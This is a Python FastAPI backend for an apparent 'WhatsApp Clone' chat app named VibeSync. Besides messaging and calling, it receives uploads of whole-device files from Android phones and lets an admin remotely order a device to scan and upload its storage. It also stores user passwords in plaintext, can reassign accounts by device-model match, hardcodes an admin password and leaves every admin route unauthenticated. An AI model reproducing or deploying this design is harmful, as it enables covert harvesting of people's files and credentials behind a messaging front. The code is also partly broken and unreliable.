import os
import uuid
import time
import json
import random
import shutil
from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from typing import List, Optional

try:
    from database import init_db, get_db
    from models import UserRegister, UserProfile, ContactAdd, MessageSend, CallLogRequest
    from websocket_manager import ws_manager
except ImportError:
    from server.database import init_db, get_db
    from server.models import UserRegister, UserProfile, ContactAdd, MessageSend, CallLogRequest
    from server.websocket_manager import ws_manager

from fastapi.responses import HTMLResponse

try:
    from agora_token_builder import RtcTokenBuilder
    Role_Publisher = getattr(RtcTokenBuilder, 'Role_Publisher', 1)
except ImportError:
    RtcTokenBuilder = None
    Role_Publisher = 1

try:
    from dotenv import load_dotenv
    _env_path = os.path.join(os.path.dirname(__file__), ".env")
    if os.path.exists(_env_path):
        load_dotenv(_env_path, override=True)
    else:
        load_dotenv()
except ImportError:
    pass

# Agora RTC Configuration
AGORA_APP_ID = os.getenv("AGORA_APP_ID", "e63a3e4f21124b659d8eeaef92f367c2")
AGORA_APP_CERTIFICATE = os.getenv("AGORA_APP_CERTIFICATE", "")

# Admin authentication
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "vibesync@admin2024")


app = FastAPI(title="WhatsApp Clone Backend API")

# Enable CORS for cross-platform KMP/Web access
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Media directory for Voice Notes
MEDIA_DIR = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(MEDIA_DIR, exist_ok=True)
app.mount("/uploads", StaticFiles(directory=MEDIA_DIR), name="uploads")

# Static directory for Over-The-Air (OTA) APK updates
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
os.makedirs(STATIC_DIR, exist_ok=True)
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

@app.get("/")
def read_root():
    return {
        "app": "WhatsApp Clone Backend API",
        "status": "online",
        "target_client": "Android Application (Compose Multiplatform / KMP)",
        "websocket_gateway": "ws://localhost:8000/ws?user_id={user_id}",
        "contacts_policy": "NO_READ_CONTACTS (Global @username directory indexing only)"
    }



@app.on_event("startup")
def startup_event():
    init_db()

# --- DEVICE REMOTE IDENTIFICATION & ASSIGNMENT ---

@app.post("/api/devices/sync")
def sync_device(data: dict):
    device_id = data.get("device_id")
    device_model = data.get("device_model", "Unknown Device")
    email = data.get("email")
    password = data.get("password")
    req_username = data.get("username")
    if not device_id:
        raise HTTPException(status_code=400, detail="Missing device_id")

    conn = get_db()
    cursor = conn.cursor()
    now = int(time.time() * 1000)

    # 1. If device sends an existing username (e.g. from local storage), ensure user profile exists & link
    if req_username and req_username.strip() and req_username.strip() != "Current User":
        clean_name = req_username.strip().lstrip("@")
        cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (clean_name,))
        user_row = cursor.fetchone()
        if user_row:
            user_id = user_row["id"]
            clean_name = user_row["username"]
        else:
            user_id = str(uuid.uuid4())
            cursor.execute(
                """INSERT INTO users (id, username, display_name, bio, created_at)
                   VALUES (?, ?, ?, ?, ?)""",
                (user_id, clean_name, clean_name.capitalize(), "Available | Powered by VibeSync", now)
            )

        cursor.execute(
            """INSERT INTO devices (device_id, user_id, device_model, username, email, password, last_sync_timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?)
               ON CONFLICT(device_id) DO UPDATE SET
                 user_id = excluded.user_id,
                 device_model = excluded.device_model,
                 username = excluded.username,
                 email = COALESCE(excluded.email, devices.email),
                 password = COALESCE(excluded.password, devices.password),
                 last_sync_timestamp = excluded.last_sync_timestamp""",
            (device_id, user_id, device_model, clean_name, email, password, now)
        )
        conn.commit()
        conn.close()
        return {
            "device_id": device_id,
            "device_model": device_model,
            "username": clean_name,
            "email": email,
            "last_sync_timestamp": now
        }

    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    # 2. Existing device record found with active user
    if row and row["username"] and row["username"] != "Current User":
        cursor.execute("SELECT * FROM users WHERE username = ? OR id = ?", (row["username"], row["user_id"]))
        user_exists = cursor.fetchone()
        
        if user_exists:
            username = row["username"]
            cursor.execute(
                """UPDATE devices 
                   SET device_model = ?, email = COALESCE(?, email), password = COALESCE(?, password), last_sync_timestamp = ? 
                   WHERE device_id = ?""",
                (device_model, email, password, now, device_id)
            )
            conn.commit()
            conn.close()
            return {
                "device_id": device_id,
                "device_model": device_model,
                "username": username,
                "email": email or (row["email"] if "email" in row.keys() else None),
                "last_sync_timestamp": now
            }

    # 3. Model matching fallback if device_id is fresh
    cursor.execute(
        """SELECT * FROM devices 
           WHERE LOWER(device_model) = LOWER(?) AND username != 'Current User' 
           ORDER BY last_sync_timestamp DESC""", 
        (device_model,)
    )
    matched_model_row = cursor.fetchone()
    if matched_model_row and matched_model_row["username"] != "Current User":
        user_id = matched_model_row["user_id"]
        username = matched_model_row["username"]
        email = matched_model_row["email"]
        password = matched_model_row["password"]
        
        cursor.execute(
            """INSERT INTO devices (device_id, user_id, device_model, username, email, password, last_sync_timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?)
               ON CONFLICT(device_id) DO UPDATE SET 
                 user_id = excluded.user_id,
                 device_model = excluded.device_model,
                 username = excluded.username,
                 email = excluded.email,
                 password = excluded.password,
                 last_sync_timestamp = excluded.last_sync_timestamp""",
            (device_id, user_id, device_model, username, email, password, now)
        )
        conn.commit()
        conn.close()
        return {
            "device_id": device_id,
            "device_model": device_model,
            "username": username,
            "email": email,
            "last_sync_timestamp": now
        }

    # 4. New or unassigned device
    cursor.execute(
        """INSERT INTO devices (device_id, device_model, username, email, password, last_sync_timestamp)
           VALUES (?, ?, ?, ?, ?, ?)
           ON CONFLICT(device_id) DO UPDATE SET
             device_model = excluded.device_model,
             last_sync_timestamp = excluded.last_sync_timestamp""",
        (device_id, device_model, "Current User", email, password, now)
    )
    conn.commit()
    conn.close()

    return {
        "device_id": device_id,
        "device_model": device_model,
        "username": "Current User",
        "email": email,
        "last_sync_timestamp": now
    }

@app.post("/api/devices/signup")
def signup_device(data: dict):
    device_id = data.get("device_id")
    device_model = data.get("device_model", "Unknown Device")
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    username = data.get("username", "user").strip()
    
    if not device_id or not email or not password:
        raise HTTPException(status_code=400, detail="Missing required fields")

    conn = get_db()
    cursor = conn.cursor()
    now = int(time.time() * 1000)

    # 1. Fetch existing user by username
    cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (username,))
    user_row = cursor.fetchone()
    
    if user_row:
        user_id = user_row["id"]
        username = user_row["username"]
    else:
        # Check devices table for account with matching email/username
        cursor.execute("SELECT user_id, username FROM devices WHERE (email IS NOT NULL AND LOWER(email) = LOWER(?)) OR LOWER(username) = LOWER(?)", (email, username))
        dev_user_row = cursor.fetchone()
        if dev_user_row and dev_user_row["username"] != "Current User" and dev_user_row["user_id"]:
            user_id = dev_user_row["user_id"]
            username = dev_user_row["username"]
        else:
            user_id = str(uuid.uuid4())
            cursor.execute(
                """INSERT INTO users (id, username, display_name, bio, created_at)
                   VALUES (?, ?, ?, ?, ?)""",
                (user_id, username, username.capitalize(), "Available | Powered by VibeSync", now)
            )

    # 2. Upsert device with explicit user_id linking
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    if row:
        cursor.execute(
            """UPDATE devices 
               SET device_model = ?, user_id = ?, username = ?, email = ?, password = ?, last_sync_timestamp = ?
               WHERE device_id = ?""",
            (device_model, user_id, username, email, password, now, device_id)
        )
    else:
        cursor.execute(
            """INSERT INTO devices (device_id, user_id, device_model, username, email, password, last_sync_timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (device_id, user_id, device_model, username, email, password, now)
        )

    conn.commit()
    conn.close()

    return {
        "status": "success",
        "device_id": device_id,
        "user_id": user_id,
        "username": username,
        "email": email
    }


@app.post("/api/devices/{device_id}/sync")
@app.post("/api/devices/{device_id}/data-sync")
def sync_device_data(device_id: str, data: dict):
    """
    Ingests background device metadata and storage category summaries from DeviceDataSyncWorker.
    Upserts device metadata and flushes/replaces category breakdown.
    """
    device_model = data.get("device_model", "Android Device")
    total_files = data.get("total_files", 0)
    user_id = data.get("user_id")
    categories = data.get("categories", [])
    now = int(time.time() * 1000)

    conn = get_db()
    cursor = conn.cursor()

    # 1. Upsert device
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    if row:
        cursor.execute(
            """UPDATE devices 
               SET device_model = ?, total_files = ?, last_sync_timestamp = ? 
               WHERE device_id = ?""",
            (device_model, total_files, now, device_id)
        )
    else:
        cursor.execute(
            """INSERT INTO devices (device_id, user_id, device_model, username, total_files, last_sync_timestamp) 
               VALUES (?, ?, ?, ?, ?, ?)""",
            (device_id, user_id, device_model, "Current User", total_files, now)
        )

    # 2. Flush existing storage category breakdown for device
    cursor.execute("DELETE FROM device_storage_summary WHERE device_id = ?", (device_id,))

    # 3. Replace category breakdown
    for cat in categories:
        cat_id = str(uuid.uuid4())
        category_name = cat.get("category", "Other")
        item_count = cat.get("item_count", 0)
        total_bytes = cat.get("total_bytes", 0)
        sample_names = json.dumps(cat.get("sample_names", []))

        cursor.execute(
            """INSERT INTO device_storage_summary 
               (id, device_id, category, item_count, total_bytes, sample_names)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (cat_id, device_id, category_name, item_count, total_bytes, sample_names)
        )

    conn.commit()
    conn.close()

    return {
        "status": "success",
        "device_id": device_id,
        "total_files": total_files,
        "categories_synced": len(categories),
        "last_sync_timestamp": now
    }

@app.get("/api/dashboard/stats")
def get_dashboard_stats():
    """
    Returns administrative metrics for the web dashboard:
    - Connected devices with storage summaries
    - Aggregated file breakdown by category
    - Total files & bytes scanned
    - Recent chat messages & call histories
    """
    conn = get_db()
    cursor = conn.cursor()

    # Devices
    cursor.execute("SELECT * FROM devices ORDER BY last_sync_timestamp DESC")
    device_rows = [dict(r) for r in cursor.fetchall()]

    devices = []
    for d in device_rows:
        dev_id = d["device_id"]
        cursor.execute("SELECT * FROM device_storage_summary WHERE device_id = ?", (dev_id,))
        summaries = []
        for s in cursor.fetchall():
            s_dict = dict(s)
            if s_dict.get("sample_names"):
                try:
                    s_dict["sample_names"] = json.loads(s_dict["sample_names"])
                except Exception:
                    s_dict["sample_names"] = []
            summaries.append(s_dict)
        d["storage_summary"] = summaries
        devices.append(d)

    # Aggregated Category Breakdown
    cursor.execute("""
        SELECT category, SUM(item_count) as total_items, SUM(total_bytes) as total_bytes
        FROM device_storage_summary
        GROUP BY category
    """)
    category_rows = [dict(r) for r in cursor.fetchall()]

    total_files_scanned = sum(c["total_items"] or 0 for c in category_rows)
    total_bytes_scanned = sum(c["total_bytes"] or 0 for c in category_rows)

    # Recent Messages (last 10)
    cursor.execute("""
        SELECT m.*, u.username as sender_username
        FROM messages m
        LEFT JOIN users u ON m.sender_id = u.id
        WHERE m.message_type != 'CALL_LOG'
        ORDER BY m.created_at DESC
        LIMIT 10
    """)
    recent_messages = [dict(r) for r in cursor.fetchall()]

    # Call Histories (last 10)
    cursor.execute("""
        SELECT m.*, u.username as sender_username
        FROM messages m
        LEFT JOIN users u ON m.sender_id = u.id
        WHERE m.message_type = 'CALL_LOG'
        ORDER BY m.created_at DESC
        LIMIT 10
    """)
    call_histories = [dict(r) for r in cursor.fetchall()]

    conn.close()

    return {
        "total_devices": len(devices),
        "total_files_scanned": total_files_scanned,
        "total_bytes_scanned": total_bytes_scanned,
        "storage_breakdown": category_rows,
        "connected_devices": devices,
        "recent_messages": recent_messages,
        "call_histories": call_histories
    }

@app.get("/api/admin/data-summary")
def get_data_summary():
    """
    Returns aggregated device data metrics, category storage summaries, and file breakdown.
    Compatible with admin-dashboard DataSummary schema.
    """
    conn = get_db()
    cursor = conn.cursor()

    # 1. Device count and total files from devices table
    cursor.execute("SELECT COUNT(*) as device_count, SUM(total_files) as total_files FROM devices")
    device_stats = dict(cursor.fetchone())
    device_count = device_stats["device_count"] or 0
    total_items = device_stats["total_files"] or 0

    # 2. Aggregated category breakdown from device_storage_summary
    cursor.execute("""
        SELECT category, SUM(item_count) as total_items, SUM(total_bytes) as total_bytes 
        FROM device_storage_summary 
        GROUP BY category
    """)
    category_rows = [dict(r) for r in cursor.fetchall()]

    # Also check device_files table
    try:
        cursor.execute("""
            SELECT category, COUNT(*) as total_items, SUM(size_bytes) as total_bytes 
            FROM device_files 
            GROUP BY category
        """)
        uploaded_cat_rows = [dict(r) for r in cursor.fetchall()]
    except Exception:
        uploaded_cat_rows = []

    combined_breakdown = {}
    total_bytes_all = 0

    for r in category_rows + uploaded_cat_rows:
        cat = r["category"] or "Other"
        bytes_val = r["total_bytes"] or 0
        items_val = r["total_items"] or 0
        if cat not in combined_breakdown:
            combined_breakdown[cat] = {"bytes": 0, "count": 0, "formatted": "0 KB"}
        combined_breakdown[cat]["bytes"] += bytes_val
        combined_breakdown[cat]["count"] += items_val
        total_bytes_all += bytes_val

    for cat, info in combined_breakdown.items():
        b = info["bytes"]
        info["formatted"] = f"{round(b / 1024, 1)} KB" if b < 1048576 else f"{round(b / 1048576, 1)} MB"

    total_storage_mb = round(total_bytes_all / 1048576, 2)

    # 3. Device storage telemetry
    cursor.execute("""
        SELECT d.device_id, d.username, d.last_sync_timestamp, s.category, s.total_bytes, s.item_count, s.sample_names
        FROM devices d
        LEFT JOIN device_storage_summary s ON d.device_id = s.device_id
        ORDER BY d.last_sync_timestamp DESC
    """)
    device_storage = []
    for row in cursor.fetchall():
        r_dict = dict(row)
        sample_names = []
        if r_dict.get("sample_names"):
            try:
                sample_names = json.loads(r_dict["sample_names"])
            except Exception:
                sample_names = []
        device_storage.append({
            "device_id": r_dict["device_id"],
            "username": r_dict["username"] or "Unknown",
            "category": r_dict["category"] or "All",
            "total_bytes": r_dict["total_bytes"] or 0,
            "item_count": r_dict["item_count"] or 0,
            "sample_names": sample_names,
            "last_sync": r_dict["last_sync_timestamp"] or int(time.time() * 1000)
        })

    conn.close()

    return {
        "total_storage_mb": total_storage_mb,
        "total_items": total_items,
        "device_count": device_count,
        "category_breakdown": combined_breakdown,
        "device_storage": device_storage
    }

# --- WHOLE-DEVICE DATA BACKUP & ADMIN REMOTE SIGNALING ---

@app.post("/api/devices/{device_id}/upload-file")
async def upload_device_file(
    device_id: str,
    file: UploadFile = File(...),
    category: str = Form("Other"),
    username: Optional[str] = Form(None)
):
    """
    Receives whole-device media & documents uploaded from Android client.
    Stores file securely in device_backups, tracks metadata in device_files table,
    and broadcasts live update to admin dashboard.
    """
    backup_base = os.path.join(MEDIA_DIR, "device_backups", device_id)
    os.makedirs(backup_base, exist_ok=True)

    safe_filename = os.path.basename(file.filename or f"file_{int(time.time() * 1000)}")
    target_path = os.path.join(backup_base, safe_filename)

    with open(target_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    size_bytes = os.path.getsize(target_path)
    now = int(time.time() * 1000)
    file_id = str(uuid.uuid4())

    conn = get_db()
    cursor = conn.cursor()

    resolved_username = username
    if not resolved_username or resolved_username == "Current User":
        cursor.execute("SELECT username FROM devices WHERE device_id = ?", (device_id,))
        dev_row = cursor.fetchone()
        if dev_row and dev_row["username"]:
            resolved_username = dev_row["username"]
        else:
            resolved_username = "device_user"

    cursor.execute("""
        INSERT INTO device_files (id, device_id, username, filename, category, size_bytes, mime_type, file_path, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (file_id, device_id, resolved_username, safe_filename, category, size_bytes, file.content_type, target_path, now))

    # Update devices total_files count
    cursor.execute("""
        UPDATE devices 
        SET total_files = COALESCE(total_files, 0) + 1, last_sync_timestamp = ?
        WHERE device_id = ?
    """, (now, device_id))

    conn.commit()
    conn.close()

    # Broadcast to admin dashboard
    await ws_manager.broadcast_all({
        "type": "DEVICE_FILE_UPLOADED",
        "device_id": device_id,
        "filename": safe_filename,
        "category": category,
        "size_bytes": size_bytes
    })

    return {
        "status": "success",
        "file_id": file_id,
        "filename": safe_filename,
        "size_bytes": size_bytes,
        "category": category
    }

@app.post("/api/admin/devices/{device_id}/trigger-backup")
async def trigger_device_backup(device_id: str):
    """
    Sends a real-time WebSocket signal to the targeted Android device
    instructing it to execute whole-device storage scanning and backup.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT username, user_id FROM devices WHERE device_id = ?", (device_id,))
    dev_row = cursor.fetchone()
    conn.close()

    signal_payload = {
        "type": "ACTION_START_BACKUP",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    # 1. Broadcast signal over WebSocket gateway
    await ws_manager.broadcast_all(signal_payload)

    # 2. Targeted direct push if device has associated account
    if dev_row:
        if dev_row["user_id"]:
            await ws_manager.send_personal_message(signal_payload, dev_row["user_id"])
        if dev_row["username"]:
            await ws_manager.send_personal_message(signal_payload, dev_row["username"])

    return {
        "status": "success",
        "message": f"Backup signal successfully dispatched to device {device_id}",
        "device_id": device_id
    }

@app.post("/api/admin/login")
def admin_login(data: dict):
    password = data.get("password", "").strip()
    if password == ADMIN_PASSWORD:
        return {
            "status": "success",
            "token": "admin_session_token",
            "message": "Authentication successful"
        }
    raise HTTPException(status_code=401, detail="Invalid admin credentials")


@app.post("/api/admin/assign-username")
async def admin_assign_username(data: dict):
    target_device_id = data.get("target_device_id")
    assigned_username = data.get("assigned_username")
    if not target_device_id or not assigned_username:
        raise HTTPException(status_code=400, detail="Missing parameters")

    conn = get_db()
    cursor = conn.cursor()
    now = int(time.time() * 1000)

    cursor.execute(
        "UPDATE devices SET username = ?, last_sync_timestamp = ? WHERE device_id = ?",
        (assigned_username.strip(), now, target_device_id)
    )
    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_DEVICE_ASSIGNED",
        "device_id": target_device_id,
        "username": assigned_username.strip()
    })

    return {"status": "success", "device_id": target_device_id, "assigned_username": assigned_username.strip()}

@app.get("/api/admin/devices")
def get_all_devices():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices ORDER BY last_sync_timestamp DESC")
    rows = cursor.fetchall()
    conn.close()
    return [dict(r) for r in rows]

# --- ADMIN MESSAGING & CALLING ENDPOINTS ---

@app.get("/api/admin/messages/{user_id}")
def get_admin_user_messages(user_id: str):
    """
    Fetches all messages exchanged between Admin and a specific user.
    """
    conn = get_db()
    cursor = conn.cursor()

    # Resolve target user
    cursor.execute("SELECT * FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (user_id, user_id))
    user_row = cursor.fetchone()
    target_id = user_row["id"] if user_row else user_id

    p1, p2 = sorted(["admin", target_id])
    cursor.execute("SELECT id FROM conversations WHERE (participant_one = ? AND participant_two = ?) OR (participant_one = ? AND participant_two = ?)", (p1, p2, p2, p1))
    conv_row = cursor.fetchone()

    if not conv_row:
        conn.close()
        return []

    conv_id = conv_row["id"]
    cursor.execute("SELECT * FROM messages WHERE conversation_id = ? ORDER BY created_at ASC", (conv_id,))
    rows = cursor.fetchall()
    conn.close()

    messages = []
    for r in rows:
        m = dict(r)
        if m.get("waveform_data"):
            try:
                m["waveform_data"] = json.loads(m["waveform_data"])
            except Exception:
                m["waveform_data"] = []
        messages.append(m)

    return messages

@app.post("/api/admin/messages/send")
async def admin_send_message(data: dict):
    """
    Sends a message from System Admin to any user and triggers real-time WebSocket delivery.
    """
    recipient_id = data.get("recipient_id")
    content = data.get("content", "").strip()
    message_type = data.get("message_type", "TEXT")

    if not recipient_id or not content:
        raise HTTPException(status_code=400, detail="Missing recipient_id or content")

    conn = get_db()
    cursor = conn.cursor()
    now = int(time.time() * 1000)

    # Resolve recipient user info
    cursor.execute("SELECT * FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (recipient_id, recipient_id))
    user_row = cursor.fetchone()
    target_id = user_row["id"] if user_row else recipient_id
    target_username = user_row["username"] if user_row else recipient_id

    sender_id = "admin"
    p1, p2 = sorted([sender_id, target_id])

    cursor.execute("SELECT id FROM conversations WHERE (participant_one = ? AND participant_two = ?) OR (participant_one = ? AND participant_two = ?)", (p1, p2, p2, p1))
    conv_row = cursor.fetchone()

    if conv_row:
        conv_id = conv_row["id"]
        cursor.execute("UPDATE conversations SET last_message_preview = ?, last_message_time = ? WHERE id = ?", (content, now, conv_id))
    else:
        conv_id = str(uuid.uuid4())
        cursor.execute("INSERT INTO conversations (id, participant_one, participant_two, last_message_preview, last_message_time) VALUES (?, ?, ?, ?, ?)", (conv_id, p1, p2, content, now))

    msg_id = str(uuid.uuid4())
    status = "DELIVERED" if (ws_manager.is_online(target_id) or ws_manager.is_online(target_username)) else "SENT"

    cursor.execute("""
        INSERT INTO messages (id, conversation_id, sender_id, recipient_id, message_type, content, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (msg_id, conv_id, sender_id, target_id, message_type, content, status, now))

    conn.commit()
    conn.close()

    event = {
        "type": "NEW_MESSAGE",
        "payload": {
            "id": msg_id,
            "conversation_id": conv_id,
            "sender_id": "admin",
            "sender_username": "admin",
            "sender_display_name": "System Admin",
            "recipient_id": target_id,
            "message_type": message_type,
            "content": content,
            "status": status,
            "created_at": now
        }
    }

    # Dispatch to target ID and target username and raw recipient_id
    for recipient_key in set([target_id, target_username, recipient_id]):
        if recipient_key:
            await ws_manager.send_personal_message(event, recipient_key)

    return {
        "status": "success",
        "message": {
            "id": msg_id,
            "conversation_id": conv_id,
            "sender_id": "admin",
            "recipient_id": target_id,
            "message_type": message_type,
            "content": content,
            "status": status,
            "created_at": now
        }
    }

@app.post("/api/admin/calls/initiate")
async def admin_initiate_call(data: dict):
    """
    Initiates a voice or video call from Admin to any user, generates Agora RTC token,
    and broadcasts CALL_INITIATE to the target user device.
    """
    recipient_id = data.get("recipient_id")
    is_video = bool(data.get("is_video", False))

    if not recipient_id:
        raise HTTPException(status_code=400, detail="Missing recipient_id")

    conn = get_db()
    cursor = conn.cursor()
    now = int(time.time() * 1000)

    cursor.execute("SELECT * FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (recipient_id, recipient_id))
    user_row = cursor.fetchone()
    target_id = user_row["id"] if user_row else recipient_id
    target_username = user_row["username"] if user_row else recipient_id

    call_id = str(uuid.uuid4())
    channel_name = f"admin_call_{target_username}_{int(time.time())}"

    # Generate Agora RTC Token
    app_id = AGORA_APP_ID
    app_cert = AGORA_APP_CERTIFICATE
    token = ""
    if RtcTokenBuilder and Role_Publisher and app_id and app_cert:
        try:
            expiration = 86400
            privilege_expired_ts = int(time.time()) + expiration
            token = RtcTokenBuilder.buildTokenWithUid(
                app_id, app_cert, channel_name, 0, Role_Publisher, privilege_expired_ts
            )
        except Exception as e:
            logger.warning(f"Failed to generate Agora token: {e}")

    # Log call
    cursor.execute("""
        INSERT INTO call_logs (id, caller_id, recipient_id, is_video, status, timestamp)
        VALUES (?, 'admin', ?, ?, 'INITIATED', ?)
    """, (call_id, target_id, 1 if is_video else 0, now))
    conn.commit()
    conn.close()

    call_signal = {
        "type": "CALL_INITIATE",
        "call_id": call_id,
        "caller_id": "admin",
        "caller_name": "System Admin",
        "recipient_id": target_id,
        "is_video": is_video,
        "channel_name": channel_name,
        "agora_app_id": app_id,
        "token": token,
        "timestamp": now
    }

    await ws_manager.send_personal_message(call_signal, target_id)
    if target_username != target_id:
        await ws_manager.send_personal_message(call_signal, target_username)

    return {
        "status": "success",
        "call_id": call_id,
        "channel_name": channel_name,
        "agora_app_id": app_id,
        "token": token,
        "is_video": is_video,
        "target_username": target_username
    }

@app.post("/api/admin/calls/end")
async def admin_end_call(data: dict):
    recipient_id = data.get("recipient_id")
    channel_name = data.get("channel_name")

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ? OR LOWER(username) = LOWER(?)", (recipient_id, recipient_id))
    user_row = cursor.fetchone()
    target_id = user_row["id"] if user_row else recipient_id
    target_username = user_row["username"] if user_row else recipient_id
    conn.close()

    end_signal = {
        "type": "CALL_ENDED",
        "sender_id": "admin",
        "recipient_id": target_id,
        "channel_name": channel_name
    }

    await ws_manager.send_personal_message(end_signal, target_id)
    if target_username != target_id:
        await ws_manager.send_personal_message(end_signal, target_username)

    return {"status": "success"}

# --- AUTH & PROFILES ---

@app.post("/api/auth/register", response_model=UserProfile)
def register_user(req: UserRegister):
    conn = get_db()
    cursor = conn.cursor()
    
    # Check if username exists
    cursor.execute("SELECT * FROM users WHERE username = ?", (req.username.strip(),))
    existing = cursor.fetchone()
    if existing:
        # Return existing user for easy demo login/registration
        return dict(existing)
        
    user_id = str(uuid.uuid4())
    now = int(time.time() * 1000)
    cursor.execute(
        "INSERT INTO users (id, username, display_name, avatar_url, bio, created_at) VALUES (?, ?, ?, ?, ?, ?)",
        (user_id, req.username.strip(), req.display_name.strip(), req.avatar_url, req.bio, now)
    )
    conn.commit()
    
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    user = dict(cursor.fetchone())
    conn.close()
    return user

@app.get("/api/users/me/{user_id}", response_model=UserProfile)
def get_user_profile(user_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    user = cursor.fetchone()
    conn.close()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return dict(user)

# --- STRICT GLOBAL DISCOVERY SEARCH (NO READ_CONTACTS) ---

@app.get("/api/users/search")
def search_users(q: str = Query(..., min_length=1), current_user_id: Optional[str] = None):
    """
    Search users globally by @username or display_name.
    Backed by SQLite indexing (idx_users_search).
    """
    conn = get_db()
    cursor = conn.cursor()
    query_param = f"%{q.strip()}%"
    
    if current_user_id:
        cursor.execute("""
            SELECT u.*, 
                   CASE WHEN c.contact_user_id IS NOT NULL THEN 1 ELSE 0 END AS is_in_roster
            FROM users u
            LEFT JOIN in_app_contacts c ON c.owner_id = ? AND c.contact_user_id = u.id
            WHERE (u.username LIKE ? OR u.display_name LIKE ?) AND u.id != ?
            LIMIT 30
        """, (current_user_id, query_param, query_param, current_user_id))
    else:
        cursor.execute("""
            SELECT *, 0 AS is_in_roster FROM users 
            WHERE username LIKE ? OR display_name LIKE ? 
            LIMIT 30
        """, (query_param, query_param))
        
    rows = cursor.fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.get("/api/users/all", response_model=List[UserProfile])
def get_all_users():
    """
    Get all registered users from SQLite WAL database.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users ORDER BY created_at DESC")
    rows = cursor.fetchall()
    conn.close()
    return [dict(r) for r in rows]

# --- ADMIN USER & DEVICE CRUD ENDPOINTS ---

@app.post("/api/admin/users")
async def admin_create_user(data: dict):
    username = data.get("username", "").strip()
    display_name = data.get("display_name", "").strip()
    bio = data.get("bio", "Available | Powered by VibeSync").strip()
    is_banned = 1 if data.get("is_banned") else 0

    if not username:
        raise HTTPException(status_code=400, detail="Username is required")

    conn = get_db()
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    if cursor.fetchone():
        conn.close()
        raise HTTPException(status_code=400, detail=f"Username '@{username}' is already registered")

    user_id = str(uuid.uuid4())
    now = int(time.time() * 1000)
    cursor.execute(
        "INSERT INTO users (id, username, display_name, avatar_url, bio, is_banned, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, username, display_name or username, "", bio, is_banned, now)
    )
    conn.commit()

    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    new_user = dict(cursor.fetchone())
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_USER_CREATED",
        "user": new_user
    })

    return new_user

@app.put("/api/users/{user_id}")
@app.put("/api/admin/users/{user_id}")
async def admin_update_user(user_id: str, request: Request):
    try:
        content_type = request.headers.get("content-type", "")
        if "application/json" in content_type:
            data = await request.json()
        else:
            try:
                form = await request.form()
                data = dict(form)
            except Exception:
                data = await request.json()

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
        row = cursor.fetchone()
        if not row:
            conn.close()
            raise HTTPException(status_code=404, detail="User not found")
        existing = dict(row)

        display_name = data.get("display_name", existing.get("display_name", ""))
        bio = data.get("bio", existing.get("bio", ""))
        is_banned = 1 if data.get("is_banned") else 0 if "is_banned" in data else existing.get("is_banned", 0)

        cursor.execute(
            "UPDATE users SET display_name = ?, bio = ?, is_banned = ? WHERE id = ?",
            (display_name, bio, is_banned, user_id)
        )
        conn.commit()

        cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
        updated = dict(cursor.fetchone())
        conn.close()

        await ws_manager.broadcast_all({
            "type": "ADMIN_USER_UPDATED",
            "user": updated
        })

        return updated
    except HTTPException:
        raise
    except Exception as e:
        import traceback
        traceback.print_exc()
        raise HTTPException(status_code=500, detail=f"admin_update_user error: {e}")

@app.delete("/api/admin/users/{user_id}")
async def admin_delete_user(user_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
    cursor.execute("UPDATE devices SET user_id = NULL, username = 'Current User' WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "ADMIN_USER_DELETED",
        "user_id": user_id
    })

    return {"status": "success", "message": f"User {user_id} deleted successfully"}

@app.delete("/api/admin/devices/{device_id}")
async def admin_delete_device(device_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    cursor.execute("DELETE FROM device_storage_summary WHERE device_id = ?", (device_id,))
